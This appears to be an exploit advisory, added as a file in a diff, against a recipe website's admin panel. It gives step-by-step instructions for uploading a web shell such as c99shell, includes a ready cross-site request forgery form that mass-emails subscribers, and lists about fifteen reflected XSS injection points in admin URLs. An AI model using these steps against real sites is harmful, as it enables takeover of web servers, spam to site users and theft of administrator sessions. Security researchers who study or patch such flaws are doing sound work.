@@ -1,0 +1,41 @@
+Shell upload vulnerability
+ 
+Visit link:
+http://www.example.com/recipes/admin/add_logo.php
+Upload your shell (ex. c99shell.php)
+Your shell should be here:
+http://www.example.com/recipes/admin/uploads/logo_.php
+If by any chanse is not there, open this page:
+http://www.example.com/recipes/admin/logo.php
+You&#039;ll see broken html object, right click &gt; properties, and you will
+see the link to your shell
+
+Send email to subscribers
+
+&lt;form action=&quot;http://www.example.com/recipes/admin/send_email_users.php&quot;
+method=&quot;POST&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;from_email&quot; value=&quot;support@site.com&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;subject&quot; value=&quot;Subject&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;message&quot; value=&quot;Free your mind and the
+ass will follow!&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;emailtype&quot; value=&quot;&quot;&gt;
+  &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;Send&quot;&gt;
+&lt;/form&gt;
+
+http://www.example.com/recipes/admin/edit_footertext.php
+
+http://www.example.com/recipes/admin/recipes.php?searchword=&quot;[XSS]
+http://www.example.com/recipes/admin/recipes.php?numitem=&quot;[XSS]
+http://www.example.com/recipes/admin/categories.php?searchword=&quot;[XSS]
+http://www.example.com/recipes/admin/categories.php?numitem=&quot;[XSS]
+http://www.example.com/recipes/admin/all_comments.php?searchword=&quot;[XSS]
+http://www.example.com/recipes/admin/all_comments.php?numitem=&quot;[XSS]
+http://www.example.com/recipes/admin/users.php?searchword=&quot;[XSS]
+http://www.example.com/recipes/admin/users.php?numitem=&quot;[XSS]
+http://www.example.com/recipes/admin/comments.php?searchword=&quot;[XSS]
+http://www.example.com/recipes/admin/comments.php?numitem=&quot;[XSS]
+http://www.example.com/recipes/admin/menus.php?numitem=&quot;[XSS]
+http://www.example.com/recipes/admin/links.php?searchword=&quot;[XSS]
+http://www.example.com/recipes/admin/links.php?numitem=&quot;[XSS]
+http://www.example.com/recipes/admin/banners.php?searchword=&quot;[XSS]
+http://www.example.com/recipes/admin/banners.php?numitem=&quot;[XSS]
